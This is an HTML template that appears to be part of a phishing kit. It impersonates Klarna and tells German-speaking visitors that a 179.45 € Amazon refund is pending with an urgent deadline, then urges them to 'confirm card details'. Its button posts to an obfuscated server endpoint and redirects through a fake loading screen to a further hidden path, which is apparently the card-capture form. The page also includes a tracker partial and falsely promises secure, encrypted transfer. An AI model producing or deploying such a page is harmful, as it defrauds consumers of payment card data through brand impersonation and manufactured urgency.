<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klarna Refund</title>
    <!-- Importing Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./css/bavoka.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <%- include('partials/tracker') %>
</head>

<body>
    <div class="login-container">
        <div class="form1">
            <div class="up">
                <!-- Header -->
                <div class="header-row">
                    <button class="back-btn" aria-label="Go back">
                        <svg aria-hidden="true" role="img" viewBox="0 0 20 20" height="24" width="24">
                            <g fill="none" fill-rule="evenodd" transform="translate(0, 0) scale(1)">
                                <path
                                    d="M12.5 9.167H4.047c.418-.365.828-.74 1.222-1.129a27.562 27.562 0 0 0 2.905-3.381l-1.348-.98a25.873 25.873 0 0 1-2.728 3.176c-.91.899-1.892 1.73-2.919 2.471a.833.833 0 0 0 0 1.352 24.844 24.844 0 0 1 2.92 2.471 25.87 25.87 0 0 1 2.727 3.177l1.348-.981a27.57 27.57 0 0 0-2.905-3.381c-.394-.39-.804-.764-1.222-1.129H12.5c2.757 0 5 2.243 5 5h1.667A6.674 6.674 0 0 0 12.5 9.167Z"
                                    fill="rgba(11, 5, 29, 1)" style="transition: fill 0.2s;"></path>
                            </g>
                        </svg>
                    </button>

                    <div class="hodpa">
                        <img src="./img/huodop.PNG" alt="">
                    </div>

                    <button class="close-btn" style="position: static;" aria-label="Close">
                        <svg width="18" height="18" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path
                                d="M14 1.41L12.59 0L7 5.59L1.41 0L0 1.41L5.59 7L0 12.59L1.41 14L7 8.41L12.59 14L14 12.59L8.41 7L14 1.41Z"
                                fill="#535353" />
                        </svg>
                    </button>
                </div>

                <!-- Hero Section (Retaining the "App" design feel but in the card) -->
                <div class="hero-icon-container">
                    <img class="refudi-ico" src="./img/refudi-ico.svg" alt="">
                    <h1 style="margin-top: 0; font-size: 24px;">Rückerstattung verfügbar</h1>
                </div>

                <!-- Transaction Review (Design Concept) -->
                <div class="store-card" style="margin-bottom: 24px; background-color: #f7f7f7;">
                    <div class="store-info">
                        <div class="store-logo" style="background: #000; color: #fff;"><img src="./img/ico-amz.svg" alt=""></div>
                        <div class="store-details">
                            <h3>Amazon</h3>
                            <p>179,45 € • 19. Jan</p>
                        </div>
                    </div>
                    <div style="font-weight: 700; color: #5a00c1;">Rückerstattung</div>
                </div>

                <!-- Order Details Toggle -->
                <div style="text-align: center; margin-bottom: 24px;">
                    <a href="#" id="toggleDetailsBtn"
                        style="font-size: 14px; color: #666; text-decoration: underline;">Bestelldetails anzeigen ↓</a>
                </div>

                <!-- Hidden Order Details -->
                <div id="orderDetails"
                    style="display: none; background-color: #f7f7f7; border-radius: 12px; padding: 16px; margin-bottom: 24px;">
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                        <span style="font-size: 14px; color: #666;">Bestellnummer:</span>
                        <span style="font-size: 14px; font-weight: 500;">#83291048</span>
                    </div>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                        <span style="font-size: 14px; color: #666;">Rückerstattungsdatum:</span>
                        <span style="font-size: 14px; font-weight: 500;">19. Jan 2026</span>
                    </div>
                    <div style="display: flex; justify-content: space-between;">
                        <span style="font-size: 14px; color: #666;">Frist:</span>
                        <span style="font-size: 14px; font-weight: 500; color: #c00;">21. Jan 2026</span>
                    </div>
                </div>

                <div class="store-card" style="margin-bottom: 24px; background-color: #f7f7f7; display: none;">
                    <div class="store-info">
                        <div class="store-logo" style="background: #000; color: #fff;"><img src="./img/ico-amz.svg" alt=""></div>
                        <div class="store-details">
                            <h3>Amazon</h3>
                            <p>179,45 € • 19. Jan</p>
                        </div>
                    </div>
                    <div  style="font-weight: 700; color: #007ac1;">Rückerstattung</div>
                </div>

                <div class="info-box-purple" style="margin-top: 0;">
                    <div class="info-content">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#5328b7" stroke="none">
                            <circle cx="12" cy="12" r="10" />
                            <path d="M12 16v-4" stroke="white" stroke-width="2" />
                            <circle cx="12" cy="8" r="1" fill="white" />
                        </svg>
                        <span>
                            Wir konnten die Rückerstattung nicht deiner ursprünglichen Zahlungsmethode zuordnen.
                            <br><br>
                            <strong>Bitte bestätige deine Kartendaten, um die Auszahlung von 179,45 € zu
                                erhalten.</strong>
                        </span>
                    </div>
                </div>
            </div>

            <div class="down">
                <div class="bottom-spacer">
                    <!-- Action Button -->
                    <a href="#" class="submit-btn btn"
                        style="text-decoration: none; display: block; text-align: center; margin-bottom: 16px;">
                        Jetzt Geld erhalten
                    </a>

                    <p class="fine-print">
                        Deine Daten werden sicher und verschlüsselt übertragen.
                    </p>
                </div>
            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var toggleBtn = document.getElementById('toggleDetailsBtn');
            var detailsBox = document.getElementById('orderDetails');

            if (toggleBtn && detailsBox) {
                toggleBtn.addEventListener('click', function (e) {
                    e.preventDefault();
                    if (detailsBox.style.display === 'none') {
                        detailsBox.style.display = 'block';
                        toggleBtn.textContent = 'Bestelldetails verbergen ↑';
                    } else {
                        detailsBox.style.display = 'none';
                        toggleBtn.textContent = 'Bestelldetails anzeigen ↓';
                    }
                });
            }
        });

        $("a.btn").click(function(e){
            e.preventDefault();
            $.ajax({
                url: '/EpLP85AgNE4pn4RtpL', 
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({}),
                success: function(info) {
                    if(info.OK){
                        window.location = "/loading?time=9&url=/QcEwP85AgNE4pnL5mWSM";
                    }
                }
            });
        })
    </script>
    
    
   
</body>
</html>